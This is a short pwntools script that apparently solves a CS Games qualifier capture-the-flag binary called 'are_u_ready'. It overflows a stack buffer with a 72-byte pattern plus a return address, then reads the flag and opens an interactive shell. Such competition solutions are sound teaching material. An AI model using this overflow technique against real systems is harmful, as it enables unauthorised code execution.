#!/usr/bin/env python2
from pwn import *

host = "csgames-quals.frigon.app"
port = 8000
binary_path = "./are_u_ready"

context.update(arch="amd64", os="linux")

def get_process():
    if args["REMOTE"]:
        return remote(host, port)
    else:
        return process(binary_path)

payload = ""
p = get_process()

if args["PAUSE"]:
    pause()

target = 0x4006b6

payload += cyclic(72)
payload += p64(target)

p.sendlineafter("ARE YOU READY FOR THE CSGAMES ?!?!", payload)

p.sendline("cat flag")

p.interactive()

